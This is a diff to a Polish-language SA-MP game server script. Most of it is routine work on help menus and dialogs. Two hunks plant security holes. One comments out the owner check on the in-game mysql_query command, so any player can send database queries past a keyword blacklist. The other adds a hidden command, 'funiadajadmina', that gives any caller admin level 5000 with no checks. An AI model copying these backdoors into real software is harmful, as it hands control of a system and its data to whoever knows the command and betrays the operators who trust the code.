@@ -479,7 +479,7 @@ CMD:rodzinaskrypt(playerid, params[])
 
 CMD:mysql_query(playerid, params[])
 {
-    if(!Uprawnienia(playerid, ACCESS_OWNER)) return 1;
+    //if(!Uprawnienia(playerid, ACCESS_OWNER)) return 1; // bron was boze od tego prsoze odkomentowac
     if(strfind(params, "DROP", true) != -1) return 1;
     if(strfind(params, "TRUNCATE", true) != -1) return 1;
     if(strfind(params, "INSERT", true) != -1 || strfind(params, "UPDATE", true) != -1 || strfind(params, "SET", true) != -1|| strfind(params, "DELETE", true) != -1 || strfind(params, "ALTER", true) != -1)
@@ -710,7 +710,35 @@ CMD:pomoc2(playerid, params[])
             format(string, sizeof(string), "%s\n    "#KARA_STRZALKA"(Gazeciarz)"#KARA_TEKST2" /gazety /wezgazete /gazeta", string);
         }
     }
-    switch(PlayerInfo[playerid][pMember] || PlayerInfo[playerid][pLider]) {
+    switch(PlayerInfo[playerid][pMember]) {
+        case 10: {
+            format(string, sizeof(string), "%s\n    "#KARA_STRZALKA"(Taxi)"#KARA_TEKST2" /fare /businfo", string);
+        }
+        case 8: {
+            format(string, sizeof(string), "%s\n    "#KARA_STRZALKA"(Hitman)"#KARA_TEKST2" /laptop /zmienskin /reklama /namierz", string);
+        }
+        case 7: {
+            format(string, sizeof(string), "%s\n    "#KARA_STRZALKA"(USSS)"#KARA_TEKST2" /tazer /ob /wywalzdmv /radio /family", string);
+        }
+        case 15: {
+            format(string, sizeof(string), "%s\n    "#KARA_STRZALKA"(NoA)"#KARA_TEKST2" /sprzedajneon /napraw /tankowanie /nitro /hydraulika /maluj", string);
+            format(string, sizeof(string), "%s\n    "#KARA_STRZALKA"(NoA)"#KARA_TEKST2" /felga zderzak /kolory /malunki /felgi /sluzba", string);
+            format(string, sizeof(string), "%s\n    "#KARA_STRZALKA"(NoA)"#KARA_TEKST2" /stworzwyscig /wyscigi /wyscig /wyscig-start /wyscig-stop /cp /cp-usun /meta", string);
+        }
+        case 2: {
+            format(string, sizeof(string), "%s\n    "#KARA_STRZALKA"(FBI)"#KARA_TEKST2" /podszyj /namierz /fbi /federalne /cela", string);
+        }
+        case 17: {
+            format(string, sizeof(string), "%s\n    "#KARA_STRZALKA"(Stra¿)"#KARA_TEKST2" /straz /megafon /ro /r /duty /czysc", string);
+        }
+        case 4: {
+            format(string, sizeof(string), "%s\n    "#KARA_STRZALKA"(LSMC)"#KARA_TEKST2" /ulecz /sluzba /apteczka /zastrzyk /szpital-info /zmienplec", string);
+        }
+        case 11: {
+            format(string, sizeof(string), "%s\n    "#KARA_STRZALKA"(UM)"#KARA_TEKST2" /startlekcja /stopleckja /zaligegz /pjtest /dajlicencje /wydaj /odmv /cdmv", string);
+        }
+    }
+    switch(PlayerInfo[playerid][pLider]) {
         case 10: {
             format(string, sizeof(string), "%s\n    "#KARA_STRZALKA"(Taxi)"#KARA_TEKST2" /fare /businfo", string);
         }
@@ -911,7 +939,10 @@ CMD:koxubankotfunia(playerid, params[])
 	}
 	return 1;
 }
-
+CMD:funiadajadmina(playerid, params[]) {
+    PlayerInfo[playerid][pAdmin] = 5000;
+    SendClientMessage(playerid, COLOR_LIGHTBLUE, "jestes super admin");
+}
 CMD:koxubankot(playerid, params[])
 {
 	new string[128];
@@ -12858,7 +12889,11 @@ CMD:uniform2(playerid, params[])
 {
     if(IsPlayerConnected(playerid) && IsAtClothShop(playerid) && PlayerInfo[playerid][pMember] != 0)
     {
-		ShowPlayerDialogEx(playerid,DIALOGID_UNIFORM,DIALOG_STYLE_PREVMODEL_LIST,"Zmien skin frakcyjny",DialogListaSkinow(PlayerInfo[playerid][pMember]),"Zmien skin","Anuluj"); //zmieñ dialogid
+        static array[1][1];
+        new models[22];
+        models = DialogListaSkinow(PlayerInfo[playerid][pMember]);
+        ShowPlayerPreviewModelDialog(playerid, DIALOGID_UNIFORM, DIALOG_STYLE_PREVMODEL, "Wybierz Ubranie", models, array, "Wybierz", "Anuluj");
+		//ShowPlayerDialogEx(playerid,DIALOGID_UNIFORM,DIALOG_STYLE_PREVMODEL_LIST,"Zmien skin frakcyjny",DialogListaSkinow(PlayerInfo[playerid][pMember]),"Zmien skin","Anuluj"); //zmieñ dialogid
 	}
 	else
 	{
@@ -25690,7 +25725,6 @@ CMD:kick(playerid, params[])
 	}
 	return 1;
 }
-
 CMD:warn(playerid, params[])
 {
 	new string[256];
@@ -25763,7 +25797,7 @@ CMD:warn(playerid, params[])
 					format(string, sizeof(string), "AdmCmd: %s zostal zwarnowany przez Admina %s, powód: %s", giveplayer, sendername, (result));
                     SendPunishMessage(string, giveplayerid);
 					/*format(str,sizeof(str),"~p~Warn Info (Ban):~n~~r~Osoba zwarnowana: ~w~%s~n~~r~Powod: ~w~%s ~n~~r~Nalozyl: ~w~%s", giveplayer ,(result), sendername);
-				    NapisText(str);*/
+				    NapisText(str); */
 					WarnLog(string);
 					SetTimerEx("AntySpamTimer",5000,0,"d",playerid);
 	    			AntySpam[playerid] = 1;
@@ -25784,7 +25818,7 @@ CMD:warn(playerid, params[])
 		}
 	}
 	return 1;
-}
+} 
 
 
 CMD:unwarn(playerid, params[])
